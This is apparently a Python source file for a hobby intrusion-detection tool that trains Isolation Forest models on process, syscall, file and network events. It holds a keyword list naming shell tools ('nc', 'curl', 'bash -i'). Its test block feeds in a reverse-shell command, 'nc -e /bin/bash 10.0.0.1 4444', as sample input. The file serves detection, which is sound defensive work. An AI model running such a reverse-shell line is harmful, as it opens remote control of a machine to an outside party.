#!/usr/bin/env python3
"""
SENTINEL ML Anomaly Detection - Day 7
Uses Isolation Forest and statistical models to detect anomalies
"""

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from collections import deque
import json
import os
import time
from datetime import datetime, timedelta
import threading
import pickle
import hashlib

class MLAnomalyDetector:
    """Machine Learning based anomaly detection for SENTINEL"""
    
    def __init__(self, model_path="~/sentinel/models/"):
        self.model_path = os.path.expanduser(model_path)
        os.makedirs(self.model_path, exist_ok=True)
        
        # Feature windows for different detection types
        self.process_window = deque(maxlen=1000)
        self.syscall_window = deque(maxlen=500)
        self.file_window = deque(maxlen=500)
        self.network_window = deque(maxlen=500)
        
        # ML Models
        self.process_model = None
        self.syscall_model = None
        self.file_model = None
        self.network_model = None
        
        # Scalers
        self.process_scaler = StandardScaler()
        self.syscall_scaler = StandardScaler()
        self.file_scaler = StandardScaler()
        self.network_scaler = StandardScaler()
        
        # Baseline statistics
        self.baselines = {}
        self.anomaly_threshold = 0.15
        self.training_samples = 100
        
        # Individual model training flags
        self.process_trained = False
        self.syscall_trained = False
        self.file_trained = False
        self.network_trained = False
        
        self.lock = threading.Lock()
        self._initialize_models()
        
    def _initialize_models(self):
        """Initialize or load existing ML models"""
        try:
            self._load_models()
            print("[ML] Loaded existing models")
        except:
            print("[ML] Initializing new models - training required")
            self.process_model = IsolationForest(
                contamination=0.05, random_state=42, n_estimators=100
            )
            self.syscall_model = IsolationForest(
                contamination=0.05, random_state=42, n_estimators=100
            )
            self.file_model = IsolationForest(
                contamination=0.05, random_state=42, n_estimators=100
            )
            self.network_model = IsolationForest(
                contamination=0.05, random_state=42, n_estimators=100
            )
    
    @property
    def models_trained(self):
        """Return True if ANY model is trained (for compatibility)"""
        return any([
            self.process_trained,
            self.syscall_trained,
            self.file_trained,
            self.network_trained
        ])
    
    def _save_models(self):
        """Save trained models to disk"""
        models = {
            'process_model': self.process_model,
            'syscall_model': self.syscall_model,
            'file_model': self.file_model,
            'network_model': self.network_model,
            'process_scaler': self.process_scaler,
            'syscall_scaler': self.syscall_scaler,
            'file_scaler': self.file_scaler,
            'network_scaler': self.network_scaler,
            'baselines': self.baselines,
            'process_trained': self.process_trained,
            'syscall_trained': self.syscall_trained,
            'file_trained': self.file_trained,
            'network_trained': self.network_trained
        }
        
        model_file = os.path.join(self.model_path, 'anomaly_models.pkl')
        with open(model_file, 'wb') as f:
            pickle.dump(models, f)
        
        with open(model_file, 'rb') as f:
            model_hash = hashlib.sha256(f.read()).hexdigest()
        
        with open(os.path.join(self.model_path, 'model_hash.txt'), 'w') as f:
            f.write(model_hash)
        
        print(f"[ML] Models saved (hash: {model_hash[:8]}...)")
    
    def _load_models(self):
        """Load trained models from disk"""
        model_file = os.path.join(self.model_path, 'anomaly_models.pkl')
        with open(model_file, 'rb') as f:
            models = pickle.load(f)
        
        self.process_model = models['process_model']
        self.syscall_model = models['syscall_model']
        self.file_model = models['file_model']
        self.network_model = models['network_model']
        self.process_scaler = models['process_scaler']
        self.syscall_scaler = models['syscall_scaler']
        self.file_scaler = models['file_scaler']
        self.network_scaler = models['network_scaler']
        self.baselines = models.get('baselines', {})
        self.process_trained = models.get('process_trained', False)
        self.syscall_trained = models.get('syscall_trained', False)
        self.file_trained = models.get('file_trained', False)
        self.network_trained = models.get('network_trained', False)
    
    def extract_process_features(self, event):
        """Extract numerical features from process event"""
        features = []
        
        features.append(1 if event.get('is_root', False) else 0)
        features.append(len(event.get('cmdline', '')))
        features.append(event.get('ppid', 0))
        features.append(event.get('uid', 0))
        
        cmd = event.get('cmdline', '').lower()
        features.append(1 if 'nc' in cmd else 0)
        features.append(1 if 'wget' in cmd else 0)
        features.append(1 if 'curl' in cmd else 0)
        features.append(1 if 'bash -i' in cmd else 0)
        features.append(1 if 'python -c' in cmd else 0)
        features.append(1 if 'perl -e' in cmd else 0)
        
        name = event.get('comm', '')
        if name:
            entropy = self._calculate_entropy(name)
            features.append(entropy)
        else:
            features.append(0)
        
        return np.array(features).reshape(1, -1)
    
    def extract_syscall_features(self, event):
        """Extract numerical features from syscall event"""
        features = []
        features.append(event.get('syscall_num', 0))
        features.append(event.get('arg_count', 0))
        features.append(1 if event.get('failed', False) else 0)
        
        syscall_num = event.get('syscall_num', 0)
        recent_count = sum(1 for e in self.syscall_window 
                          if e.get('syscall_num') == syscall_num)
        features.append(recent_count)
        
        features.append(1 if event.get('is_root', False) else 0)
        features.append(event.get('pid', 0) % 1000)
        
        return np.array(features).reshape(1, -1)
    
    def extract_file_features(self, event):
        """Extract numerical features from file access event"""
        features = []
        
        path = event.get('path', '')
        features.append(len(path))
        features.append(path.count('/'))
        features.append(1 if path.startswith('/etc/') else 0)
        features.append(1 if path.startswith('/root/') else 0)
        features.append(1 if path.startswith('/tmp/') else 0)
        features.append(1 if '.so' in path else 0)
        features.append(1 if '.ko' in path else 0)
        
        features.append(event.get('flags', 0))
        features.append(1 if event.get('is_write', False) else 0)
        features.append(1 if event.get('is_root', False) else 0)
        
        if path:
            entropy = self._calculate_entropy(path)
            features.append(entropy)
        else:
            features.append(0)
        
        return np.array(features).reshape(1, -1)
    
    def extract_network_features(self, event):
        """Extract numerical features from network event"""
        features = []
        
        features.append(event.get('src_port', 0))
        features.append(event.get('dst_port', 0))
        features.append(event.get('protocol', 0))
        features.append(event.get('packet_size', 0))
        
        dst_port = event.get('dst_port', 0)
        features.append(1 if dst_port == 22 else 0)
        features.append(1 if dst_port == 23 else 0)
        features.append(1 if dst_port == 4444 else 0)
        features.append(1 if dst_port == 1337 else 0)
        features.append(1 if dst_port in [80, 443] else 0)
        
        src_ip = event.get('src_ip', '')
        recent_conns = sum(1 for e in self.network_window 
                          if e.get('src_ip') == src_ip)
        features.append(recent_conns)
        
        features.append(1 if event.get('is_root', False) else 0)
        
        return np.array(features).reshape(1, -1)
    
    def _calculate_entropy(self, string):
        """Calculate Shannon entropy of a string"""
        if not string:
            return 0
        
        freq = {}
        for char in string:
            freq[char] = freq.get(char, 0) + 1
        
        entropy = 0
        length = len(string)
        for count in freq.values():
            prob = count / length
            entropy -= prob * np.log2(prob)
        
        return entropy
    
    def add_process_event(self, event):
        """Add process event to window and check for anomalies"""
        with self.lock:
            self.process_window.append(event)
            
            # Train if we have enough data and haven't trained yet
            if len(self.process_window) >= self.training_samples and not self.process_trained:
                self._train_process_model()
                self.process_trained = True
                self._save_models()
            
            if self.process_trained:
                return self._check_process_anomaly(event)
        return None
    
    def add_syscall_event(self, event):
        """Add syscall event to window and check for anomalies"""
        with self.lock:
            self.syscall_window.append(event)
            
            if len(self.syscall_window) >= self.training_samples and not self.syscall_trained:
                self._train_syscall_model()
                self.syscall_trained = True
                self._save_models()
            
            if self.syscall_trained:
                return self._check_syscall_anomaly(event)
        return None
    
    def add_file_event(self, event):
        """Add file event to window and check for anomalies"""
        with self.lock:
            self.file_window.append(event)
            
            if len(self.file_window) >= self.training_samples and not self.file_trained:
                self._train_file_model()
                self.file_trained = True
                self._save_models()
            
            if self.file_trained:
                return self._check_file_anomaly(event)
        return None
    
    def add_network_event(self, event):
        """Add network event to window and check for anomalies"""
        with self.lock:
            self.network_window.append(event)
            
            if len(self.network_window) >= self.training_samples and not self.network_trained:
                self._train_network_model()
                self.network_trained = True
                self._save_models()
            
            if self.network_trained:
                return self._check_network_anomaly(event)
        return None
    
    def _train_process_model(self):
        """Train Isolation Forest on process data"""
        if len(self.process_window) < self.training_samples:
            return
        
        print("[ML] Training process anomaly model...")
        
        X = []
        for event in list(self.process_window)[-self.training_samples:]:
            features = self.extract_process_features(event)
            X.append(features.flatten())
        
        X = np.array(X)
        X_scaled = self.process_scaler.fit_transform(X)
        self.process_model.fit(X_scaled)
        
        predictions = self.process_model.predict(X_scaled)
        anomaly_rate = np.sum(predictions == -1) / len(predictions)
        
        self.baselines['process'] = {
            'mean_features': X.mean(axis=0).tolist(),
            'std_features': X.std(axis=0).tolist(),
            'anomaly_rate': anomaly_rate,
            'training_time': datetime.now().isoformat()
        }
        
        print(f"[ML] Process model trained (baseline anomaly rate: {anomaly_rate:.2%})")
    
    def _train_syscall_model(self):
        """Train Isolation Forest on syscall data"""
        if len(self.syscall_window) < self.training_samples:
            return
        
        print("[ML] Training syscall anomaly model...")
        
        X = []
        for event in list(self.syscall_window)[-self.training_samples:]:
            features = self.extract_syscall_features(event)
            X.append(features.flatten())
        
        X = np.array(X)
        X_scaled = self.syscall_scaler.fit_transform(X)
        self.syscall_model.fit(X_scaled)
        
        predictions = self.syscall_model.predict(X_scaled)
        anomaly_rate = np.sum(predictions == -1) / len(predictions)
        
        self.baselines['syscall'] = {
            'anomaly_rate': anomaly_rate,
            'training_time': datetime.now().isoformat()
        }
        
        print(f"[ML] Syscall model trained (baseline anomaly rate: {anomaly_rate:.2%})")
    
    def _train_file_model(self):
        """Train Isolation Forest on file access data"""
        if len(self.file_window) < self.training_samples:
            return
        
        print("[ML] Training file access anomaly model...")
        
        X = []
        for event in list(self.file_window)[-self.training_samples:]:
            features = self.extract_file_features(event)
            X.append(features.flatten())
        
        X = np.array(X)
        X_scaled = self.file_scaler.fit_transform(X)
        self.file_model.fit(X_scaled)
        
        predictions = self.file_model.predict(X_scaled)
        anomaly_rate = np.sum(predictions == -1) / len(predictions)
        
        self.baselines['file'] = {
            'anomaly_rate': anomaly_rate,
            'training_time': datetime.now().isoformat()
        }
        
        print(f"[ML] File model trained (baseline anomaly rate: {anomaly_rate:.2%})")
    
    def _train_network_model(self):
        """Train Isolation Forest on network data"""
        if len(self.network_window) < self.training_samples:
            return
        
        print("[ML] Training network anomaly model...")
        
        X = []
        for event in list(self.network_window)[-self.training_samples:]:
            features = self.extract_network_features(event)
            X.append(features.flatten())
        
        X = np.array(X)
        X_scaled = self.network_scaler.fit_transform(X)
        self.network_model.fit(X_scaled)
        
        predictions = self.network_model.predict(X_scaled)
        anomaly_rate = np.sum(predictions == -1) / len(predictions)
        
        self.baselines['network'] = {
            'anomaly_rate': anomaly_rate,
            'training_time': datetime.now().isoformat()
        }
        
        print(f"[ML] Network model trained (baseline anomaly rate: {anomaly_rate:.2%})")
    
    def _check_process_anomaly(self, event):
        """Check if process event is anomalous"""
        features = self.extract_process_features(event)
        features_scaled = self.process_scaler.transform(features)
        prediction = self.process_model.predict(features_scaled)
        
        if prediction[0] == -1:
            score = self.process_model.score_samples(features_scaled)[0]
            return {
                'type': 'process_anomaly',
                'event': event,
                'score': float(score),
                'severity': 'CRITICAL' if score < -0.7 else 'HIGH' if score < -0.5 else 'MEDIUM',
                'timestamp': datetime.now().isoformat()
            }
        return None
    
    def _check_syscall_anomaly(self, event):
        """Check if syscall event is anomalous"""
        features = self.extract_syscall_features(event)
        features_scaled = self.syscall_scaler.transform(features)
        prediction = self.syscall_model.predict(features_scaled)
        
        if prediction[0] == -1:
            score = self.syscall_model.score_samples(features_scaled)[0]
            return {
                'type': 'syscall_anomaly',
                'event': event,
                'score': float(score),
                'severity': 'CRITICAL' if score < -0.7 else 'HIGH',
                'timestamp': datetime.now().isoformat()
            }
        return None
    
    def _check_file_anomaly(self, event):
        """Check if file access event is anomalous"""
        features = self.extract_file_features(event)
        features_scaled = self.file_scaler.transform(features)
        prediction = self.file_model.predict(features_scaled)
        
        if prediction[0] == -1:
            score = self.file_model.score_samples(features_scaled)[0]
            return {
                'type': 'file_anomaly',
                'event': event,
                'score': float(score),
                'severity': 'CRITICAL' if score < -0.7 else 'HIGH',
                'timestamp': datetime.now().isoformat()
            }
        return None
    
    def _check_network_anomaly(self, event):
        """Check if network event is anomalous"""
        features = self.extract_network_features(event)
        features_scaled = self.network_scaler.transform(features)
        prediction = self.network_model.predict(features_scaled)
        
        if prediction[0] == -1:
            score = self.network_model.score_samples(features_scaled)[0]
            return {
                'type': 'network_anomaly',
                'event': event,
                'score': float(score),
                'severity': 'CRITICAL' if score < -0.7 else 'HIGH',
                'timestamp': datetime.now().isoformat()
            }
        return None
    
    def get_statistics(self):
        """Get current ML statistics"""
        return {
            'models_trained': self.models_trained,
            'process_trained': self.process_trained,
            'syscall_trained': self.syscall_trained,
            'file_trained': self.file_trained,
            'network_trained': self.network_trained,
            'baselines': self.baselines,
            'window_sizes': {
                'process': len(self.process_window),
                'syscall': len(self.syscall_window),
                'file': len(self.file_window),
                'network': len(self.network_window)
            },
            'timestamp': datetime.now().isoformat()
        }

# Singleton instance
ml_detector = MLAnomalyDetector()

# Example usage and testing
if __name__ == "__main__":
    print("SENTINEL ML Anomaly Detector - Day 7")
    print("=" * 50)
    print(f"[*] Model path: {ml_detector.model_path}")
    print(f"[*] Models trained: {ml_detector.models_trained}")
    print(f"[*] Training samples needed: {ml_detector.training_samples}")
    
    print("\n[*] Simulating training data...")
    
    for i in range(150):
        event = {
            'pid': 1000 + i,
            'ppid': 1,
            'uid': 0 if i % 10 == 0 else 1000,
            'comm': f'process_{i}',
            'cmdline': f'/usr/bin/normal_process_{i}',
            'is_root': i % 10 == 0
        }
        ml_detector.add_process_event(event)
    
    print(f"[*] Process events collected: {len(ml_detector.process_window)}")
    print(f"[*] Process model trained: {ml_detector.process_trained}")
    
    print("\n[*] Testing anomaly detection...")
    
    suspicious_event = {
        'pid': 9999,
        'ppid': 1,
        'uid': 0,
        'comm': 'suspicious',
        'cmdline': 'nc -e /bin/bash 10.0.0.1 4444',
        'is_root': True
    }
    
    result = ml_detector.add_process_event(suspicious_event)
    if result:
        print(f"[!!!] Anomaly detected!")
        print(f"      Type: {result['type']}")
        print(f"      Score: {result['score']:.4f}")
        print(f"      Severity: {result['severity']}")
    else:
        print(f"[*] Event normal")
    
    stats = ml_detector.get_statistics()
    print(f"\n[*] Statistics:")
    print(f"    Process trained: {stats['process_trained']}")
    print(f"    Process window: {stats['window_sizes']['process']} events")
    print(f"    Baseline anomaly rate: {stats['baselines'].get('process', {}).get('anomaly_rate', 0):.2%}")
    
